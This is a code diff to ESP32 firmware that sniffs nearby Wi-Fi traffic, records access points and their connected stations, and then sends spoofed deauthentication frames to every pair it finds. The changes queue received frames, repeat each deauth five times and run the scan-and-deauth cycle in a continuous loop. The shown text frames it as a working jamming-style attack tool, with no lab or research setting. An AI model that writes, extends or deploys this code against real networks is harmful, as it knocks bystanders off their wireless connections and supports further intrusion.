@@ -146,6 +146,8 @@ QueueHandle_t packet_reception_queue = NULL;
 dma_list_item* rx_chain_begin = NULL;
 dma_list_item* rx_chain_last = NULL;
 
+MyQueue *received_packets = NULL;
+
 volatile int interrupt_count = 0;
 
 dma_list_item *tx_item = NULL;
@@ -210,7 +212,7 @@ unsigned char custom_probe_request_packet[] =
 	0x1, 0x4, 0x2, 0x4, 0xb, 0x16, 
 	0x32, 0x8, 0xc, 0x12, 0x18, 0x24, 
 	0x30, 0x48, 0x60, 0x6c, 
-	// 32+18 bytes above
+	// 32+18+13 = 63 bytes above
 	0x3, 0x1, 0x1, // Channel, change custom...[52] to change the channel
 	0x2d, 0x1a, 0x2d, 0x1, 0x13, 0xff, 
 	0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 
@@ -235,6 +237,7 @@ extern int n_frequencies;
 int less_frequencies[] = {0x96c, 0x985, 0x99e};
 int n_less_frequencies = 3;
 
+int last_channel = 1;
 
 void set_datarate(uint8_t datarate, uint32_t length)
 {
@@ -312,7 +315,8 @@ void transmit_one(uint8_t *metapacket, uint8_t index, int repeat) {
 	// TRANSMIT!
 	for(int i = 0; i < repeat; i++) {
 		write_register(MAC_TX_PLCP0_BASE, read_register(MAC_TX_PLCP0_BASE) | 0xc0000000);
-		esp_rom_delay_us(1000*32); /* Maximum wait for a deauthentication*/
+		// esp_rom_delay_us(1000*32); /* Maximum wait for a deauthentication*/
+		vTaskDelay(32 / portTICK_PERIOD_MS);
 	}
 	// write_register(MAC_TX_PLCP0_BASE, read_register(MAC_TX_PLCP0_BASE) | 0xc0000000);
 	ESP_LOGW(TAG, "packet should have been sent");
@@ -497,7 +501,11 @@ void on_receive(wifi_promiscuous_pkt_t *packet)
 		return;
 	}
 
-	treat_mac80211_frame(p);
+	// treat_mac80211_frame(p);
+	// Instead of trearing the frame here, we enqueue it in the received_packets queue
+	ESP_LOGI(TAG, "Received packet");
+	ESP_LOG_BUFFER_HEXDUMP("packet-content from open_mac_rx_callback", packet->payload, 100, ESP_LOG_INFO);
+	enqueue(&received_packets, p, 1700, NULL);
 
 	// if (*(uint8_t *)((uint8_t *)packet->payload) != 0x40)
 	// {
@@ -657,6 +665,7 @@ void send_deauth_from_to(const void *data)
 	// Switch to the channel of the AP
 	ESP_LOGI(TAG, "Switching to channel %d before deauthing", couple->ap.channel);
 	switch_channel(frequencies[couple->ap.channel - 1], 0);
+	vTaskDelay(100 / portTICK_PERIOD_MS);
 	const uint8_t *ap_mac = couple->ap.mac;
 	const uint8_t *dev_mac = couple->dev.mac;
 	// Use custom deauth packet, substitute the MAC addresses
@@ -664,8 +673,10 @@ void send_deauth_from_to(const void *data)
 	memcpy(custom_deauth_packet + 18, ap_mac, 6);
 	memcpy(custom_deauth_packet + 24, ap_mac, 6);
 	// Send the packet
-	transmit_one(custom_deauth_packet, 0, 1);
-
+	transmit_one(custom_deauth_packet, 0, 5);
+	// Switch back to the last channel
+	// ESP_LOGI(TAG, "Switching back to channel %d after deauthing", couple->ap.channel);
+	// switch_channel(frequencies[last_channel - 1], 0);
 }
 
 void listen_to(int seconds)
@@ -732,7 +743,7 @@ void send_and_receive_probes(int channel, int seconds)
 	ESP_LOGI(TAG, "Switching to channel %d", channel);
 	switch_channel(frequencies[channel-1], 0);
 	// Set the channel in the probe request packet
-	custom_probe_request_packet[52] = (uint8_t)channel;
+	custom_probe_request_packet[63+2] = (uint8_t)channel;
 	// Set my MAC address in the probe request packet
 	uint8_t mac[6] = MY_MAC_ADDRESS;
 	memcpy(custom_probe_request_packet + 18, mac, 6);
@@ -744,6 +755,22 @@ void send_and_receive_probes(int channel, int seconds)
 	}
 
 	listen_to(seconds);
+}
+
+void read_queue_and_update_network(void)
+{
+	// We dequeue from the received_packets queue and send deauths using treat_mac80211_frame
+	while(true)
+	{
+		mac80211_frame *packet = (mac80211_frame *)dequeue(&received_packets);
+		if(!packet)
+		{
+			break;
+		}
+		ESP_LOG_BUFFER_HEXDUMP("packet-content from read_queue_and_update_network", packet, 100, ESP_LOG_INFO);
+		treat_mac80211_frame(packet);
+		vTaskDelay(100 / portTICK_PERIOD_MS);
+	}
 }
 
 void wifi_hardware_task(hardware_mac_args *pvParameter) 
@@ -813,10 +840,10 @@ void wifi_hardware_task(hardware_mac_args *pvParameter)
 
 	simulation(print_couple_ap_sta);
 
-    ESP_LOGW(TAG, "switch channel to 0x96c");
-    switch_channel(0x96c, 0);
-    ESP_LOGW(TAG, "done switch channel to 0x96c");
-    vTaskDelay(5*200 / portTICK_PERIOD_MS);
+    // ESP_LOGW(TAG, "switch channel to 0x96c");
+    // switch_channel(0x96c, 0);
+    // ESP_LOGW(TAG, "done switch channel to 0x96c");
+    // vTaskDelay(5*200 / portTICK_PERIOD_MS);
 
 	//for (int i = 0; i < 2; i++) {
 		//uint8_t mac[6] = {0};
@@ -847,7 +874,7 @@ void wifi_hardware_task(hardware_mac_args *pvParameter)
 		//ESP_LOGW(TAG, "still alive");
 		//vTaskDelay(500 / portTICK_PERIOD_MS);
 	//}
-	static int counter = 6;
+	static int counter = 0;
 
 	while(true)
 	{
@@ -857,7 +884,7 @@ void wifi_hardware_task(hardware_mac_args *pvParameter)
 		// ESP_LOGI(TAG, "Switching to frequency 0x%08x", next_frequency);
 		// // Set the frequency
 		// switch_channel(next_frequency, 0);
-		vTaskDelay(4*1000 / portTICK_PERIOD_MS);
+		vTaskDelay(1*1000 / portTICK_PERIOD_MS);
 
 		// // Transmit 5 packets
 		// for (int i = 0; i < 5; i++) 
@@ -874,7 +901,13 @@ void wifi_hardware_task(hardware_mac_args *pvParameter)
 		ESP_LOGI(TAG, "================================");
 		ESP_LOGI(TAG, "Sending and receiving probes");
 		ESP_LOGI(TAG, "================================");
+		last_channel = next_index+1;
 		send_and_receive_probes(next_index+1, 2);
+		read_queue_and_update_network();
+		ESP_LOGI(TAG, "Network:");
+		process_tree(network, print_couple_ap_sta);
+		ESP_LOGI(TAG, "Sending deauth packets");
+		process_tree(network, send_deauth_from_to);			
 		++counter;
 	}
 }
@@ -936,13 +969,6 @@ void treat_mac80211_frame(mac80211_frame *p)
 			insert_node(&network, &ap, sizeof(MACAddress), NULL, compare_mac_addresses);
 		}
 	}
-
-	ESP_LOGI(TAG, "Network:");
-	process_tree(network, print_couple_ap_sta);
-
-	ESP_LOGI(TAG, "Sending deauth packets");
-	process_tree(network, send_deauth_from_to);	
-
 }
 
 void reading_task(void)
